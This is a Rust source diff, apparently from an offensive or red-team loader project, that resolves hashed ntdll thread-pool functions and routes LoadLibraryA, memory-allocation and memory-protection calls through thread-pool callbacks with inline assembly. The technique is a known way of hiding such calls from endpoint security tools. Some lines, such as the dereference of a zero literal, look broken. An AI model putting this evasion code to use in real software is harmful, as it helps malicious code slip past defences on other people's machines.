@@ -1,6 +1,4 @@
 use crate::{
-    PTP_WORK,
-    HMODULE,
     api_hashing::get_function_address,
     PTP_WORK_CALLBACK,
     TP_CALLBACK_ENVIRON_V3,
@@ -14,48 +12,47 @@ use crate::{
     sleep::sleep
 };
 
-type TpAllocWork = unsafe extern "system" fn(*mut PTP_WORK, PTP_WORK_CALLBACK, *mut c_void, *mut TP_CALLBACK_ENVIRON_V3) -> NTSTATUS;
-type TpPostWork = unsafe extern "system" fn(PTP_WORK);
-type TpReleaseWork = unsafe extern "system" fn(PTP_WORK);
+type TpAllocWork = unsafe extern "system" fn(*mut isize, PTP_WORK_CALLBACK, *mut c_void, *mut TP_CALLBACK_ENVIRON_V3) -> NTSTATUS;
+type TpPostWork = unsafe extern "system" fn(isize);
+type TpReleaseWork = unsafe extern "system" fn(isize);
 
 #[link_section = ".text"]
 pub unsafe fn exec_callback(callback: PTP_WORK_CALLBACK, args: *mut c_void, ntdll_address: isize) -> bool {
 
-    let tp_alloc_work = (*(get_function_address(ntdll_address, TP_ALLOC_WORK_HASH).unwrap())) as TpAllocWork;
-    let tp_post_work = (*(get_function_address(ntdll_address, TP_POST_WORK_HASH).unwrap())) as TpPostWork;
-    let tp_release_work = (*(get_function_address(ntdll_address, TP_RELEASE_WORK_HASH).unwrap())) as TpReleaseWork;
+    let tp_alloc_work = (&*(get_function_address(ntdll_address, TP_ALLOC_WORK_HASH).unwrap())) as TpAllocWork;
+    let tp_post_work = (&*(get_function_address(ntdll_address, TP_POST_WORK_HASH).unwrap())) as TpPostWork;
+    let tp_release_work = (&*(get_function_address(ntdll_address, TP_RELEASE_WORK_HASH).unwrap())) as TpReleaseWork;
 
-    let work_return: PTP_WORK = 0;
+    let work_return: *mut isize = *0;
 
-    tp_alloc_work(*work_return, callback, args, 0 as *mut TP_CALLBACK_ENVIRON_V3);
-    tp_post_work(work_return);
-    tp_release_work(work_return);
-
+    tp_alloc_work(work_return, callback, args, 0 as *mut TP_CALLBACK_ENVIRON_V3);
+    tp_post_work(*work_return);
+    tp_release_work(*work_return);
 
     sleep(0x1000);
     return true;
 }
 
 #[link_section = ".text"]
-pub unsafe extern "stdcall" fn loadlibrary_callback(_instance: PTP_CALLBACK_INSTANCE, context: *mut c_void, _work: PTP_WORK) {
+pub unsafe extern "stdcall" fn loadlibrary_callback(_instance: PTP_CALLBACK_INSTANCE, context: *mut c_void, _work: isize) {
     asm!("mov rbx, rdi",
          "mov rax, [rbx]",       // pointer to LoadLibraryA
-         "mov rcx, [rbx + 0x8]"  // pointer to string
+         "mov rcx, [rbx + 0x8]",  // pointer to string
          "jmp rax",
          in("rdi") context,
         )
 }
 
 #[link_section = ".text"]
-pub unsafe extern "stdcall" fn nt_allocate_callback(_instance: PTP_CALLBACK_INSTANCE, context: *mut c_void, _work: PTP_WORK) {
+pub unsafe extern "stdcall" fn nt_allocate_callback(_instance: PTP_CALLBACK_INSTANCE, context: *mut c_void, _work: isize) {
 
     // Goofy work-around, I need to test this separately
     let alloc_type = (*(context as *const nt_alloc_args)).alloc_type;
 
-    asm!("mov rbx, rdi"
-        "mov rax, [rbx]"
-        "mov rcx, [rbx + 0x8]"
-        "mov rdx, [rbx + 0x10]"
+    asm!("mov rbx, rdi",
+        "mov rax, [rbx]",
+        "mov rcx, [rbx + 0x8]",
+        "mov rdx, [rbx + 0x10]",
         "xor r8, r8",               // https://0xdarkvortex.dev/hiding-in-plainsight/
         "mov r9, [rbx + 0x18]",
         "mov r10, [rbx + 0x20]",
@@ -69,14 +66,14 @@ pub unsafe extern "stdcall" fn nt_allocate_callback(_instance: PTP_CALLBACK_INST
 }
 
 #[link_section = ".text"]
-pub unsafe extern "stdcall" fn nt_protect_callback(_instance: PTP_CALLBACK_INSTANCE, context: *mut c_void, _work :PTP_WORK) {
+pub unsafe extern "stdcall" fn nt_protect_callback(_instance: PTP_CALLBACK_INSTANCE, context: *mut c_void, _work: isize) {
 
     let output = 0 as *mut u32;
 
-    asm!("mov rbx, rdi"
-        "mov rax, [rbx]"
-        "mov rcx, [rbx + 0x8]"
-        "mov rdx, [rbx + 0x10]"
+    asm!("mov rbx, rdi",
+        "mov rax, [rbx]",
+        "mov rcx, [rbx + 0x8]",
+        "mov rdx, [rbx + 0x10]",
         "mov r8, [rbx + 0x18]",
         "mov r9, [rbx + 0x20]",
         "mov [rsp+0x28], r10",
